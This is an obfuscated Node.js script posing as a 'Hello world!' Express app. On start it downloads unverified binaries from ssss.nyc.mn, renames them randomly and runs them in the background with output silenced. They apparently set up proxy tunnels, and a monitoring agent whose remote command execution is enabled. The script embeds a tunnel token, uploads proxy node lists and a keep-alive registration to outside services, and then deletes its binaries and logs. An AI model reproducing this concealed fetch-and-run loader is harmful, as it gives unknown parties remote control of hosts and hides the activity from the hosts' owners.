const _0x94f68c=_0x2b3a;(function(_0x2a00f5,_0x8b7d6e){const _0x2132f5=_0x2b3a,_0x52aaca=_0x2a00f5();while(!![]){try{const _0x3d9d0f=parseInt(_0x2132f5(0x10c))/0x1+-parseInt(_0x2132f5(0x9b))/0x2+-parseInt(_0x2132f5(0xe1))/0x3*(-parseInt(_0x2132f5(0xcd))/0x4)+parseInt(_0x2132f5(0xbb))/0x5*(-parseInt(_0x2132f5(0x120))/0x6)+-parseInt(_0x2132f5(0x126))/0x7+-parseInt(_0x2132f5(0xc1))/0x8*(-parseInt(_0x2132f5(0x12a))/0x9)+-parseInt(_0x2132f5(0x9c))/0xa*(-parseInt(_0x2132f5(0x13e))/0xb);if(_0x3d9d0f===_0x8b7d6e)break;else _0x52aaca['push'](_0x52aaca['shift']());}catch(_0x2c8f15){_0x52aaca['push'](_0x52aaca['shift']());}}}(_0xe4ca,0xa1b5f));const express=require(_0x94f68c(0x11a)),app=express(),axios=require(_0x94f68c(0x119)),os=require('os'),fs=require('fs'),path=require(_0x94f68c(0x9a)),{promisify}=require(_0x94f68c(0x13a)),exec=promisify(require('child_process')[_0x94f68c(0x130)]),{execSync}=require(_0x94f68c(0xf2)),UPLOAD_URL=process[_0x94f68c(0x134)][_0x94f68c(0x10d)]||'',PROJECT_URL=process[_0x94f68c(0x134)][_0x94f68c(0x123)]||'',AUTO_ACCESS=process[_0x94f68c(0x134)][_0x94f68c(0xa3)]||![],FILE_PATH=process[_0x94f68c(0x134)][_0x94f68c(0xfa)]||_0x94f68c(0x103),SUB_PATH=process[_0x94f68c(0x134)][_0x94f68c(0x12b)]||'sub',PORT=process[_0x94f68c(0x134)][_0x94f68c(0xd7)]||process[_0x94f68c(0x134)]['PORT']||0xbb8,UUID=process[_0x94f68c(0x134)][_0x94f68c(0x122)]||_0x94f68c(0xcf),NEZHA_SERVER=process[_0x94f68c(0x134)][_0x94f68c(0x8e)]||'',NEZHA_PORT=process[_0x94f68c(0x134)][_0x94f68c(0xbd)]||'',NEZHA_KEY=process[_0x94f68c(0x134)][_0x94f68c(0xef)]||'',ARGO_DOMAIN=process['env'][_0x94f68c(0x13c)]||_0x94f68c(0xdf),ARGO_AUTH=process[_0x94f68c(0x134)][_0x94f68c(0xc8)]||'eyJhIjoiZDg5NWZlMWJlODI0ZjE4MGVmYWEwZmQyOTMyMDAzMmQiLCJ0IjoiODc3NzYyOGQtNjQzMC00ZjI2LTgwNjUtMzczMjZhODRkZTAyIiwicyI6Ill6STJPR1JoWlRFdFpUTmxOeTAwWkRaakxUbGtZemd0TUdOaFpXTTJZMlV3WWpBNSJ9',ARGO_PORT=process[_0x94f68c(0x134)][_0x94f68c(0x93)]||0x1f41,CFIP=process[_0x94f68c(0x134)][_0x94f68c(0xbc)]||_0x94f68c(0xeb),CFPORT=process[_0x94f68c(0x134)][_0x94f68c(0x147)]||0x1bb,NAME=process[_0x94f68c(0x134)][_0x94f68c(0xb2)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x94f68c(0xc5)](FILE_PATH),console[_0x94f68c(0x138)](FILE_PATH+_0x94f68c(0x145))):console[_0x94f68c(0x138)](FILE_PATH+_0x94f68c(0x118));function generateRandomName(){const _0x5951c2=_0x94f68c,_0x558378='abcdefghijklmnopqrstuvwxyz';let _0x188b55='';for(let _0x2b02d0=0x0;_0x2b02d0<0x6;_0x2b02d0++){_0x188b55+=_0x558378[_0x5951c2(0x125)](Math[_0x5951c2(0xc2)](Math[_0x5951c2(0xbe)]()*_0x558378[_0x5951c2(0x121)]));}return _0x188b55;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0xe4ca(){const _0x466bd8=['nohup\x20','https://arm64.ssss.nyc.mn/v1','\x20is\x20created','toString','CFPORT','all','127.0.0.1','split','/vless-argo','arch','true','unlinkSync','ArgoDomain:','includes','NEZHA_SERVER','Hello\x20world!','TunnelSecret','fileName','error','ARGO_PORT','amd','false','existsSync','/trojan-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','vmess','path','26092JlRIcP','11895670ZOeCUP','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','catch','quic','\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http','AUTO_ACCESS','pop','match','/config.json\x20>/dev/null\x202>&1\x20&','push','https+local://8.8.8.8/dns-query','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://amd64.ssss.nyc.mn/web','message','https://amd64.ssss.nyc.mn/bot','writeFileSync','https://amd64.ssss.nyc.mn/agent','\x20successfully','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NAME','tunnel.json','https://oooo.serv00.net/add-url','blackhole','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','unshift','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','trojan','readdirSync','545BeEvJc','CFIP','NEZHA_PORT','random','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','312WBLpyJ','floor','status','/api/delete-nodes','mkdirSync','/vmess-argo?ed=2560','has','ARGO_AUTH','https://arm64.ssss.nyc.mn/agent','test','&path=%2Fvless-argo%3Fed%3D2560#','substring','39500oRWYNy','/tunnel.yml\x20run','34c384f2-dbcc-49b0-b3c5-0e8b11820d69','aarch64','App\x20is\x20running','from','post','stringify','2096','clear','SERVER_PORT','\x0aclient_secret:\x20','unlink','\x0a\x20\x20tunnel:\x20','\x20-c\x20\x22','\x20-p\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','snb89.102889.xyz','createWriteStream','270IDXKQp','Skipping\x20adding\x20automatic\x20access\x20task','application/json','http\x20server\x20is\x20running\x20on\x20port:','isFile','ARGO_DOMAIN:','trim','Empowerment\x20failed\x20for\x20','automatic\x20access\x20task\x20added\x20successfully','443','cdns.doon.eu.org','arm','list.txt','config.yaml','NEZHA_KEY','https://arm64.ssss.nyc.mn/web','tls','child_process','2087','/vmess-argo','rm\x20-rf\x20','Error\x20downloading\x20files:','\x22\x20>\x20/dev/null\x202>&1','stream','filter','FILE_PATH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8443','del\x20/f\x20/q\x20','direct','Download\x20','platform','?encryption=none&security=tls&sni=','vless','./tmp','utf-8','close','&fp=firefox&type=ws&host=','https://arm64.ssss.nyc.mn/bot','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','2053','none','tcp','113537MQfPiV','UPLOAD_URL','join','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20failed:\x20','readFileSync','\x20>/dev/null\x202>&1\x20&','statSync','Subscription\x20uploaded\x20successfully','Error\x20executing\x20command:\x20','xtls-rprx-vision','base64','\x20already\x20exists','axios','express','/api/add-subscriptions','boot.log','?security=tls&sni=','chmod','npm\x20running\x20error:\x20','56478qtjeRO','length','UUID','PROJECT_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','charAt','8622971OjLlmP','get','then','\x0avless://','171099RbeJgS','SUB_PATH','data','pipe','pkill\x20-f\x20\x22[','config.json','exec','win32','map','basename','env','forEach','fileUrl','https://amd64.ssss.nyc.mn/v1','log','taskkill\x20/f\x20/im\x20','util','\x0a\x20\x20credentials-file:\x20','ARGO_DOMAIN','.exe\x20>\x20nul\x202>&1','11izPdGI','Content-Type','\x0a\x20\x20\x20\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','/api/add-nodes'];_0xe4ca=function(){return _0x466bd8;};return _0xe4ca();}function _0x2b3a(_0x7935c1,_0x392d65){const _0xe4cae9=_0xe4ca();return _0x2b3a=function(_0x2b3aeb,_0x266296){_0x2b3aeb=_0x2b3aeb-0x8d;let _0x259740=_0xe4cae9[_0x2b3aeb];return _0x259740;},_0x2b3a(_0x7935c1,_0x392d65);}let npmPath=path[_0x94f68c(0x10e)](FILE_PATH,npmName),phpPath=path[_0x94f68c(0x10e)](FILE_PATH,phpName),webPath=path[_0x94f68c(0x10e)](FILE_PATH,webName),botPath=path[_0x94f68c(0x10e)](FILE_PATH,botName),subPath=path[_0x94f68c(0x10e)](FILE_PATH,'sub.txt'),listPath=path[_0x94f68c(0x10e)](FILE_PATH,_0x94f68c(0xed)),bootLogPath=path[_0x94f68c(0x10e)](FILE_PATH,_0x94f68c(0x11c)),configPath=path[_0x94f68c(0x10e)](FILE_PATH,_0x94f68c(0x12f));function deleteNodes(){const _0x2e02b4=_0x94f68c;try{if(!UPLOAD_URL)return;if(!fs[_0x2e02b4(0x96)](subPath))return;let _0x53e4be;try{_0x53e4be=fs[_0x2e02b4(0x111)](subPath,_0x2e02b4(0x104));}catch{return null;}const _0x5d6311=Buffer[_0x2e02b4(0xd2)](_0x53e4be,_0x2e02b4(0x117))[_0x2e02b4(0x146)](_0x2e02b4(0x104)),_0x36c1ec=_0x5d6311[_0x2e02b4(0x14a)]('\x0a')[_0x2e02b4(0xf9)](_0x3850df=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3850df));if(_0x36c1ec['length']===0x0)return;return axios[_0x2e02b4(0xd3)](UPLOAD_URL+_0x2e02b4(0xc4),JSON['stringify']({'nodes':_0x36c1ec}),{'headers':{'Content-Type':_0x2e02b4(0xe3)}})['catch'](_0x1a08f4=>{return null;}),null;}catch(_0x38d124){return null;}}function cleanupOldFiles(){const _0x1fc77d=_0x94f68c;try{const _0x394c7d=fs[_0x1fc77d(0xba)](FILE_PATH);_0x394c7d[_0x1fc77d(0x135)](_0x3f1186=>{const _0x53956b=_0x1fc77d,_0x325942=path[_0x53956b(0x10e)](FILE_PATH,_0x3f1186);try{const _0x248bcf=fs[_0x53956b(0x113)](_0x325942);_0x248bcf[_0x53956b(0xe5)]()&&fs['unlinkSync'](_0x325942);}catch(_0x1a33b8){}});}catch(_0x2b342a){}}app[_0x94f68c(0x127)]('/',function(_0x5b193,_0x47b42b){const _0x35db66=_0x94f68c;_0x47b42b['send'](_0x35db66(0x8f));});async function generateConfig(){const _0x2d365=_0x94f68c,_0xef1b1a={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x2d365(0x10a)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2d365(0x116)}],'decryption':_0x2d365(0x10a),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2d365(0xf4),'dest':0xbbb},{'path':_0x2d365(0x97),'dest':0xbbc}]},'streamSettings':{'network':_0x2d365(0x10b)}},{'port':0xbb9,'listen':_0x2d365(0x149),'protocol':_0x2d365(0x102),'settings':{'clients':[{'id':UUID}],'decryption':_0x2d365(0x10a)},'streamSettings':{'network':_0x2d365(0x10b),'security':'none'}},{'port':0xbba,'listen':_0x2d365(0x149),'protocol':_0x2d365(0x102),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2d365(0x10a),'wsSettings':{'path':_0x2d365(0x14b)}},'sniffing':{'enabled':!![],'destOverride':[_0x2d365(0xa2),_0x2d365(0xf1),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2d365(0x149),'protocol':_0x2d365(0x99),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2d365(0xa2),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2d365(0x149),'protocol':_0x2d365(0xb9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2d365(0x10a),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2d365(0xf1),_0x2d365(0x9f)],'metadataOnly':![]}}],'dns':{'servers':[_0x2d365(0xa8)]},'outbounds':[{'protocol':'freedom','tag':_0x2d365(0xfe)},{'protocol':_0x2d365(0xb5),'tag':'block'}]};fs['writeFileSync'](path[_0x2d365(0x10e)](FILE_PATH,'config.json'),JSON[_0x2d365(0xd4)](_0xef1b1a,null,0x2));}function getSystemArchitecture(){const _0x2a2c3f=_0x94f68c,_0x46eb2a=os[_0x2a2c3f(0x14c)]();return _0x46eb2a===_0x2a2c3f(0xec)||_0x46eb2a==='arm64'||_0x46eb2a===_0x2a2c3f(0xd0)?_0x2a2c3f(0xec):_0x2a2c3f(0x94);}function downloadFile(_0x4533a8,_0x318c9e,_0x27de95){const _0x1da3f1=_0x94f68c,_0x20504b=_0x4533a8;!fs['existsSync'](FILE_PATH)&&fs[_0x1da3f1(0xc5)](FILE_PATH,{'recursive':!![]});const _0x6b368c=fs[_0x1da3f1(0xe0)](_0x20504b);axios({'method':_0x1da3f1(0x127),'url':_0x318c9e,'responseType':_0x1da3f1(0xf8)})[_0x1da3f1(0x128)](_0x59b4dc=>{const _0x3a00a6=_0x1da3f1;_0x59b4dc[_0x3a00a6(0x12c)][_0x3a00a6(0x12d)](_0x6b368c),_0x6b368c['on']('finish',()=>{const _0x5830a8=_0x3a00a6;_0x6b368c[_0x5830a8(0x105)](),console[_0x5830a8(0x138)](_0x5830a8(0xff)+path[_0x5830a8(0x133)](_0x20504b)+_0x5830a8(0xaf)),_0x27de95(null,_0x20504b);}),_0x6b368c['on'](_0x3a00a6(0x92),_0x519e4f=>{const _0x48fa32=_0x3a00a6;fs[_0x48fa32(0xd9)](_0x20504b,()=>{});const _0x2b8855=_0x48fa32(0xff)+path[_0x48fa32(0x133)](_0x20504b)+_0x48fa32(0x110)+_0x519e4f[_0x48fa32(0xab)];console['error'](_0x2b8855),_0x27de95(_0x2b8855);});})['catch'](_0x1e052d=>{const _0x2ca86b=_0x1da3f1,_0x1cc87e=_0x2ca86b(0xff)+path[_0x2ca86b(0x133)](_0x20504b)+_0x2ca86b(0x110)+_0x1e052d['message'];console[_0x2ca86b(0x92)](_0x1cc87e),_0x27de95(_0x1cc87e);});}async function downloadFilesAndRun(){const _0x427f96=_0x94f68c,_0xae196b=getSystemArchitecture(),_0x209d94=getFilesForArchitecture(_0xae196b);if(_0x209d94[_0x427f96(0x121)]===0x0){console[_0x427f96(0x138)](_0x427f96(0x9d));return;}const _0x30bee9=_0x209d94[_0x427f96(0x132)](_0x257d8c=>{return new Promise((_0x22aac8,_0x45debd)=>{const _0x5a9351=_0x2b3a;downloadFile(_0x257d8c[_0x5a9351(0x91)],_0x257d8c[_0x5a9351(0x136)],(_0xbb653d,_0x278900)=>{_0xbb653d?_0x45debd(_0xbb653d):_0x22aac8(_0x278900);});});});try{await Promise[_0x427f96(0x148)](_0x30bee9);}catch(_0x5416b3){console[_0x427f96(0x92)](_0x427f96(0xf6),_0x5416b3);return;}function _0x287e6f(_0x51cf23){const _0x235928=_0x427f96,_0x5b363e=0x1fd;_0x51cf23[_0x235928(0x135)](_0x2b7d04=>{const _0x5dfdeb=_0x235928;fs[_0x5dfdeb(0x96)](_0x2b7d04)&&fs[_0x5dfdeb(0x11e)](_0x2b7d04,_0x5b363e,_0x454624=>{const _0x26e479=_0x5dfdeb;_0x454624?console[_0x26e479(0x92)](_0x26e479(0xe8)+_0x2b7d04+':\x20'+_0x454624):console['log']('Empowerment\x20success\x20for\x20'+_0x2b7d04+':\x20'+_0x5b363e['toString'](0x8));});});}const _0x343275=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x287e6f(_0x343275);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x56e616=NEZHA_SERVER[_0x427f96(0x8d)](':')?NEZHA_SERVER['split'](':')[_0x427f96(0xa4)]():'',_0x17d650=new Set([_0x427f96(0xea),_0x427f96(0xfc),_0x427f96(0xd5),_0x427f96(0xf3),'2083',_0x427f96(0x109)]),_0x4d5cbd=_0x17d650[_0x427f96(0xc7)](_0x56e616)?_0x427f96(0x14d):_0x427f96(0x95),_0x7a3539=_0x427f96(0xd8)+NEZHA_KEY+_0x427f96(0xfb)+NEZHA_SERVER+_0x427f96(0xde)+_0x4d5cbd+_0x427f96(0xa9)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x427f96(0xee)),_0x7a3539);const _0x24fb5c='nohup\x20'+phpPath+_0x427f96(0xdb)+FILE_PATH+_0x427f96(0xb6);try{await exec(_0x24fb5c),console[_0x427f96(0x138)](phpName+'\x20is\x20running'),await new Promise(_0x480c29=>setTimeout(_0x480c29,0x3e8));}catch(_0x5e5507){console[_0x427f96(0x92)]('php\x20running\x20error:\x20'+_0x5e5507);}}else{let _0x649137='';const _0x27821b=[_0x427f96(0xea),_0x427f96(0xfc),'2096','2087','2083',_0x427f96(0x109)];_0x27821b[_0x427f96(0x8d)](NEZHA_PORT)&&(_0x649137='--tls');const _0x5e513a='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x427f96(0xdc)+NEZHA_KEY+'\x20'+_0x649137+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5e513a),console[_0x427f96(0x138)](npmName+'\x20is\x20running'),await new Promise(_0x3c1480=>setTimeout(_0x3c1480,0x3e8));}catch(_0x38b611){console[_0x427f96(0x92)](_0x427f96(0x11f)+_0x38b611);}}}else console[_0x427f96(0x138)](_0x427f96(0x141));const _0x3505fa=_0x427f96(0x143)+webPath+'\x20-c\x20'+FILE_PATH+_0x427f96(0xa6);try{await exec(_0x3505fa),console[_0x427f96(0x138)](webName+_0x427f96(0xa0)),await new Promise(_0x97c48c=>setTimeout(_0x97c48c,0x3e8));}catch(_0x26ce7c){console[_0x427f96(0x92)]('web\x20running\x20error:\x20'+_0x26ce7c);}if(fs[_0x427f96(0x96)](botPath)){let _0x458c73;if(ARGO_AUTH[_0x427f96(0xa5)](/^[A-Z0-9a-z=]{120,250}$/))_0x458c73=_0x427f96(0x124)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x458c73='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x427f96(0xce):_0x458c73=_0x427f96(0xa1)+FILE_PATH+_0x427f96(0xdd)+ARGO_PORT;try{await exec(_0x427f96(0x143)+botPath+'\x20'+_0x458c73+_0x427f96(0x112)),console[_0x427f96(0x138)](botName+'\x20is\x20running'),await new Promise(_0x2c8285=>setTimeout(_0x2c8285,0x7d0));}catch(_0x54ac21){console['error'](_0x427f96(0x115)+_0x54ac21);}}await new Promise(_0xc0bffc=>setTimeout(_0xc0bffc,0x1388));}function getFilesForArchitecture(_0x3bd744){const _0x25b554=_0x94f68c;let _0x3815bc;_0x3bd744===_0x25b554(0xec)?_0x3815bc=[{'fileName':webPath,'fileUrl':_0x25b554(0xf0)},{'fileName':botPath,'fileUrl':_0x25b554(0x107)}]:_0x3815bc=[{'fileName':webPath,'fileUrl':_0x25b554(0xaa)},{'fileName':botPath,'fileUrl':_0x25b554(0xac)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x127b23=_0x3bd744===_0x25b554(0xec)?_0x25b554(0xc9):_0x25b554(0xae);_0x3815bc[_0x25b554(0xb7)]({'fileName':npmPath,'fileUrl':_0x127b23});}else{const _0x323659=_0x3bd744===_0x25b554(0xec)?_0x25b554(0x144):_0x25b554(0x137);_0x3815bc[_0x25b554(0xb7)]({'fileName':phpPath,'fileUrl':_0x323659});}}return _0x3815bc;}function argoType(){const _0x153418=_0x94f68c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x153418(0x138)](_0x153418(0xb0));return;}if(ARGO_AUTH['includes'](_0x153418(0x90))){fs['writeFileSync'](path[_0x153418(0x10e)](FILE_PATH,_0x153418(0xb3)),ARGO_AUTH);const _0x281708=_0x153418(0xda)+ARGO_AUTH[_0x153418(0x14a)]('\x22')[0xb]+_0x153418(0x13b)+path[_0x153418(0x10e)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x153418(0xc0);fs[_0x153418(0xad)](path['join'](FILE_PATH,'tunnel.yml'),_0x281708);}else console['log'](_0x153418(0x98));}argoType();async function extractDomains(){const _0x626fb1=_0x94f68c;let _0xed7ad;if(ARGO_AUTH&&ARGO_DOMAIN)_0xed7ad=ARGO_DOMAIN,console[_0x626fb1(0x138)](_0x626fb1(0xe6),_0xed7ad),await _0x1bfa03(_0xed7ad);else try{const _0x32621c=fs['readFileSync'](path[_0x626fb1(0x10e)](FILE_PATH,_0x626fb1(0x11c)),_0x626fb1(0x104)),_0x1e616a=_0x32621c['split']('\x0a'),_0x5e75a4=[];_0x1e616a['forEach'](_0x304fcd=>{const _0x2a7a21=_0x626fb1,_0x4b4e34=_0x304fcd[_0x2a7a21(0xa5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4b4e34){const _0x28c8ec=_0x4b4e34[0x1];_0x5e75a4[_0x2a7a21(0xa7)](_0x28c8ec);}});if(_0x5e75a4['length']>0x0)_0xed7ad=_0x5e75a4[0x0],console['log'](_0x626fb1(0x14f),_0xed7ad),await _0x1bfa03(_0xed7ad);else{console[_0x626fb1(0x138)](_0x626fb1(0xb8)),fs[_0x626fb1(0x14e)](path[_0x626fb1(0x10e)](FILE_PATH,_0x626fb1(0x11c)));async function _0x24e1c3(){const _0x383063=_0x626fb1;try{process[_0x383063(0x100)]==='win32'?await exec(_0x383063(0x139)+botName+_0x383063(0x13d)):await exec(_0x383063(0x12e)+botName[_0x383063(0x125)](0x0)+']'+botName[_0x383063(0xcc)](0x1)+_0x383063(0xf7));}catch(_0x5dcf67){}}_0x24e1c3(),await new Promise(_0x5996b2=>setTimeout(_0x5996b2,0xbb8));const _0x814cb1=_0x626fb1(0xa1)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x626fb1(0x143)+botPath+'\x20'+_0x814cb1+_0x626fb1(0x112)),console[_0x626fb1(0x138)](botName+_0x626fb1(0xa0)),await new Promise(_0x143fa1=>setTimeout(_0x143fa1,0xbb8)),await extractDomains();}catch(_0x1b1949){console[_0x626fb1(0x92)]('Error\x20executing\x20command:\x20'+_0x1b1949);}}}catch(_0x3e40e6){console[_0x626fb1(0x92)]('Error\x20reading\x20boot.log:',_0x3e40e6);}async function _0x1bfa03(_0x58b802){const _0x3a1a1f=_0x626fb1,_0x2e2315=execSync(_0x3a1a1f(0x108),{'encoding':_0x3a1a1f(0x104)}),_0x4d5668=_0x2e2315[_0x3a1a1f(0xe7)](),_0x45a36e=NAME?NAME+'-'+_0x4d5668:_0x4d5668;return new Promise(_0x512447=>{setTimeout(()=>{const _0x71a728=_0x2b3a,_0x3fa43f={'v':'2','ps':''+_0x45a36e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x71a728(0x10a),'net':'ws','type':_0x71a728(0x10a),'host':_0x58b802,'path':_0x71a728(0xc6),'tls':'tls','sni':_0x58b802,'alpn':'','fp':'firefox'},_0x4dac17=_0x71a728(0x129)+UUID+'@'+CFIP+':'+CFPORT+_0x71a728(0x101)+_0x58b802+'&fp=firefox&type=ws&host='+_0x58b802+_0x71a728(0xcb)+_0x45a36e+'\x0a\x20\x20\x0avmess://'+Buffer[_0x71a728(0xd2)](JSON[_0x71a728(0xd4)](_0x3fa43f))[_0x71a728(0x146)]('base64')+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x71a728(0x11d)+_0x58b802+_0x71a728(0x106)+_0x58b802+_0x71a728(0x10f)+_0x45a36e+_0x71a728(0x140);console['log'](Buffer['from'](_0x4dac17)[_0x71a728(0x146)]('base64')),fs[_0x71a728(0xad)](subPath,Buffer[_0x71a728(0xd2)](_0x4dac17)[_0x71a728(0x146)](_0x71a728(0x117))),console[_0x71a728(0x138)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x3ef52e,_0x37548d)=>{const _0x238701=_0x71a728,_0x1e48cd=Buffer[_0x238701(0xd2)](_0x4dac17)[_0x238701(0x146)](_0x238701(0x117));_0x37548d['set'](_0x238701(0x13f),'text/plain;\x20charset=utf-8'),_0x37548d['send'](_0x1e48cd);}),_0x512447(_0x4dac17);},0x7d0);});}}async function uploadNodes(){const _0x25976b=_0x94f68c;if(UPLOAD_URL&&PROJECT_URL){const _0x215c20=PROJECT_URL+'/'+SUB_PATH,_0x37554a={'subscription':[_0x215c20]};try{const _0x158e9c=await axios['post'](UPLOAD_URL+_0x25976b(0x11b),_0x37554a,{'headers':{'Content-Type':_0x25976b(0xe3)}});return _0x158e9c&&_0x158e9c[_0x25976b(0xc3)]===0xc8?(console['log'](_0x25976b(0x114)),_0x158e9c):null;}catch(_0x5aa660){if(_0x5aa660['response']){if(_0x5aa660['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x52fa91=fs[_0x25976b(0x111)](listPath,'utf-8'),_0x521f68=_0x52fa91[_0x25976b(0x14a)]('\x0a')[_0x25976b(0xf9)](_0x17c4b9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x25976b(0xca)](_0x17c4b9));if(_0x521f68['length']===0x0)return;const _0x3d00b2=JSON[_0x25976b(0xd4)]({'nodes':_0x521f68});try{const _0x1be89=await axios['post'](UPLOAD_URL+_0x25976b(0x142),_0x3d00b2,{'headers':{'Content-Type':_0x25976b(0xe3)}});return _0x1be89&&_0x1be89['status']===0xc8?(console[_0x25976b(0x138)]('Nodes\x20uploaded\x20successfully'),_0x1be89):null;}catch(_0x5920ed){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1d880e=_0x2b3a,_0x1099d1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1099d1['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1099d1[_0x1d880e(0xa7)](phpPath);process['platform']===_0x1d880e(0x131)?exec(_0x1d880e(0xfd)+_0x1099d1[_0x1d880e(0x10e)]('\x20')+'\x20>\x20nul\x202>&1',_0x1027fc=>{const _0x2f6b98=_0x1d880e;console[_0x2f6b98(0xd6)](),console[_0x2f6b98(0x138)](_0x2f6b98(0xd1)),console[_0x2f6b98(0x138)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x1d880e(0xf5)+_0x1099d1[_0x1d880e(0x10e)]('\x20')+'\x20>/dev/null\x202>&1',_0x363e2d=>{const _0xe7fa7e=_0x1d880e;console[_0xe7fa7e(0xd6)](),console[_0xe7fa7e(0x138)]('App\x20is\x20running'),console[_0xe7fa7e(0x138)](_0xe7fa7e(0xb1));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x441280=_0x94f68c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x441280(0x138)](_0x441280(0xe2));return;}try{const _0x497aea=await axios['post'](_0x441280(0xb4),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x441280(0x138)](_0x441280(0xe9)),_0x497aea;}catch(_0x29e6ef){return console[_0x441280(0x92)](_0x441280(0xbf)+_0x29e6ef[_0x441280(0xab)]),null;}}async function startserver(){const _0x276e94=_0x94f68c;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x920b1e){console[_0x276e94(0x92)]('Error\x20in\x20startserver:',_0x920b1e);}}startserver()[_0x94f68c(0x9e)](_0x5f1a9d=>{const _0x4bfe46=_0x94f68c;console[_0x4bfe46(0x92)]('Unhandled\x20error\x20in\x20startserver:',_0x5f1a9d);}),app['listen'](PORT,()=>console['log'](_0x94f68c(0xe4)+PORT+'!'));
